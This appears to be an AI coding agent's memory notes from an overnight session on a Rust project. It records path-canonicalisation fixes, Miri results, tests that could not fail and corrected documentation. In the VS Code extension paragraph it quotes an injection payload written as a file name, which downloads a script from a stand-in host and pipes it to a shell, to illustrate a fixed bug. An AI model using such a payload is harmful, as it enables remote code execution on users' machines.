---
name: delulu-p18-uncertainty
description: "P18 (2026-08-06) — closing every open finding: F1/F2/F3 canonicalization, VS Code injection, Miri completing, and two gates of my own that could not fail"
metadata: 
  node_type: memory
  type: project
  originSessionId: bcacf460-7d6e-4c46-a621-53fcfa099e56
  modified: 2026-08-06T18:29:47.416Z
---

**Jesse's commission, 2026-08-06: "The goal is no longer adding features. The goal is eliminating
uncertainty."** Overnight autonomous session. Commit **`7e9c5a3`** (local only, never pushed).

**F1/F2/F3 CLOSED.** All three had one cause: `⊑` is defined through `path::resolve`, which is
**not injective**, and a relation defined through a non-injective function is a *preorder* on its
domain **as a matter of mathematics** — not a bug patchable inside the comparison. "Lattice" was
right about the structure, wrong about the carrier (it belongs to the quotient). Fix =
`path::canonicalize` + `canonicalize_set`, applied at the custody boundary (`Broker::issue`,
`attenuate`, `attenuate_core`). `order_laws.rs`: 6 passed/3 ignored-and-failing → **9 passed/0
ignored**.

**The finding the earlier analysis missed:** the canonical form is an **ANTICHAIN**, not just a
normalized spelling. `{./data, ./data/sub} ≡ {./data}` — set redundancy is a *second, independent*
collapse. The Z3 model could not express it (it abstracts a dimension as a set over an opaque
element type), so the counterexample came from the enumerator. **A proof about an abstraction is
only as strong as the abstraction's ability to state the property.**

**Design trap to remember:** a relative canonical form must keep its `./` prefix, or `./C:`
(a directory named `C:`) re-resolves as `[Drive("C:")]` — the whole of drive C. That is a widening.

**TWO GATES I WROTE THAT COULD NOT FAIL** — both found by falsifying, not reading, and both written
*under* the rule that says to do that:
1. `verify-package.js` passed a genuinely broken `.vsix`; it walked only first-hop requires.
2. The 1000-agent stress test asserted "every stored authority is canonical" **vacuously**, because
   it used `Authority::new` (which canonicalizes). Deleting all three canonicalization calls left
   all seven scales green. Now builds by struct literal.
   **Shape of both: the check tested what was already true on the way in.**

**VS Code extension had a live command injection** — lenses built a shell command STRING from the
open file's path (`x;curl evil.sh|sh.delulu` executed on click; any path with a space already
broke). Plus: `delulu.authority` emitted by the server since Stage 8 with **no client registering
it**, and "run test" ignored the test name. `crates/delulu/tests/editor_contract.rs` compares the
three command lists. The `.vsix` also would not have activated (vsce shipped 1 of 8 npm packages) —
now esbuild-bundled.

**README said "no proof assistant is installed" — FALSE since P17.** Lean 4.32.2 lives at
`~/.elan/bin/lean.exe` (Windows, NOT WSL); re-verified in 37 s, all three theorems *"does not
depend on any axioms"*.

**Miri completes at last: 192 tests, 0 UB** (broker 129 / diag 45 / atlas 18). **Needs
`-Zmiri-disable-isolation`** — without it Miri aborts on `create_dir_all` as an *unsupported
operation*, and an earlier pass had recorded that abort as a failure. Run per crate; broker takes
~26 min. **`delulu-syntax` TIMES OUT at crate granularity** (whole `fmt::` module > 30 min, no result
line = not a pass); per-module batching cleared lexer/num/token/grammar/morph. Fixed properly with
**`cfg!(miri)` workload shrinking** in the two bulk fmt tests (20 generated programs not 2,000; 8
corpus files not the whole tree) — **strictly better than `--skip`, which buys a green tick by
interpreting NONE of that code**. **`-Zmiri-disable-stacked-borrows` is REFUSED**: it disables the
pointer-aliasing detector, so "0 UB" would be a weaker claim wearing the same sentence. Correct
nextest invocation is **`cargo miri nextest`**, NOT `cargo nextest run --miri`.

**Later in the same session (commits after `7e4c7d4`):** the hand-written canonicalization CORPUS was
replaced/supplemented by **generated input** (20,000 paths + 3,000 sets) because the campaign's own
rule is "do not write examples, generate inputs" and I had violated it on the most safety-critical
function added. Both generated tests independently catch the dropped `./` prefix at iterations 67
and 4, on spellings no human writes (`.\C:/./`). **`HARDENING_CAMPAIGN.md` had EIGHT section headings
saying `— OPEN` while its own summary table said CLOSED with a ruling** (C2/C4/C5/C6/C8/C15/C16/C21) —
README points readers there for "what is known to be wrong", so it overstated the defect list. C21's
code comment had known it was closed longer than the doc did. **The federation case for the
format-affecting change had NO test** — every cert round-trip used already-canonical paths; now
`a_certificate_carrying_a_non_canonical_path_adopts_canonically_without_changing_meaning`.

**Verified:** Windows 110 suites/0/1560 + sweep 22/22 + clippy 14; Linux 110/0/1566 + sweep 22/22.
Survey 1032 nodes / 8975 edges / 0 errors 0 warnings.

**Operational lessons:** WSL `nohup setsid` detached jobs do NOT survive; use harness
`run_in_background`. PowerShell 5.1 `*>` writes **UTF-16LE** — `iconv` before grepping. `cargo test`
stops at the first failing target; always `--no-fail-fast`. **The survey-staleness race bit again**
because I edited docs *while* a suite ran — the failure message already diagnoses this correctly and
names the file; freeze the tree during verification.

**Still open, not softened:** zero macOS executions (7 crates type-check x86_64, 3 check aarch64;
full workspace blocked by `libffi-sys` picking its MSVC path from the host); CI has never executed;
F4 (no principal types); IF-1 residue; **no benchmark suite exists anywhere in the repo**; no
cargo-fuzz targets. F1/F2/F3's fix is **format-affecting and shipped without an RFC** — owner
decision, recorded as a deviation. See [[delulu-proof-campaign]], [[delulu-hardening-campaign]].
